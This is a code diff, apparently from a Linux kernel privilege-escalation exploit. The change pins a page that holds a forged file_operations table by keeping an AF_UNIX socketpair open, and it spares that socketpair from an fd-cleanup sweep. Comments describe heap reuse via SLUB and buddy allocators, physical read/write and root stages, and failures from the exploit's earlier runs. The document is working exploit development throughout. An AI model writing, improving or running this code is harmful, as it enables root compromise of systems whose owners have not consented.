@@ -50,6 +50,18 @@ static void resolve_pipe_counts(void) {
 }
 
 pid_t pipe_prepare_child = -1;
+/* fix63 (2026-10-24): the skb_sv queue in prepare_pipe_buffer_page_child
+ * holds the ONLY reference pinning the payload page the fake fops table
+ * lives on (fake_fops = skb_payload_base + FOPS_TABLE_OFF).  The old code
+ * closed both ends at child return, freeing the page into the buddy where
+ * the next SLUB alloc reuser overwrites the table (ioctl slot -> 0 ->
+ * cfgfs ENOTTY -- the entire 2026-10-24 afternoon loss family: neutralize
+ * can't write, guard can't read, chain self-detonates on close).  The
+ * child keeps the pair open from now on (its fd-sweep skips these two)
+ * and the parent kills it on retry/exit -- so the page stays pinned
+ * through physrw/root/fail-path and is reclaimed exactly when the chain
+ * retires the round. */
+static int g_payload_hold_sv[2] = {-1, -1};
 uint64_t kmalloc_pipe_cache;
 uint64_t kmalloc_normal_1k_cache;
 uint64_t kmalloc_normal_2k_cache;
@@ -342,6 +354,10 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   int pcp_sv[2];
   SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, skb_sv));
   SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_sv));
+  /* fix63: register the payload pair so the fd sweep below (and the
+   * chain-exit path) leaves it open -- see g_payload_hold_sv. */
+  g_payload_hold_sv[0] = skb_sv[0];
+  g_payload_hold_sv[1] = skb_sv[1];
 
   struct iovec iov;
   memset(&iov, 0, sizeof(iov));
@@ -419,8 +435,8 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
       pr_warning("pipe child payload table dead before conv tbl=%llx rv=%d; "
                  "failing prepare\n",
                  (unsigned long long)tbl_conv, tr_conv);
-      close(skb_sv[0]);
-      close(skb_sv[1]);
+      /* fix63: keep skb_sv open -- the fail path's neutralize still needs
+       * the payload page pinned; the retry kills this child and reclaims. */
       free(buf);
       return 0;
     }
@@ -833,8 +849,9 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   close(conv_fd);
 
   pin_to_core(CORE);
-  SYSCHK(close(skb_sv[0]));
-  SYSCHK(close(skb_sv[1]));
+  /* fix63: skb_sv deliberately NOT closed -- the payload page must stay
+   * pinned (fake table alive) for every cfgfs op until the parent kills
+   * this child at retry/exit. */
 
   free(buf);
   return base;
@@ -883,9 +900,15 @@ uintptr_t prepare_pipe_buffer_page(void) {
      * f_op->flush/release as garbage (0x10) and jumps there -> panic
      * (pstore: pipe_prepare pc=0x10 lr=filp_close+0x54).  A clean fd table
      * makes that exit safe no matter when the page dies.  Only /dev/null
-     * (opened below) and 0/1/2 survive. */
-    for (int fd = 3; fd < 4096; fd++)
+     * (opened below) and 0/1/2 survive -- and fix63's payload socketpair,
+     * which the sweep now spares: it is the pin keeping the fake table's
+     * page alive for the parent's cfgfs ops. */
+    for (int fd = 3; fd < 4096; fd++) {
+      if (fd == g_payload_hold_sv[0] || fd == g_payload_hold_sv[1]) {
+        continue;
+      }
       close(fd);
+    }
     g_fops_probe_fd = -1; /* inherited global fd is now closed */
     int null_fd = open("/dev/null", O_RDWR | O_CLOEXEC);
     if (null_fd >= 0) {
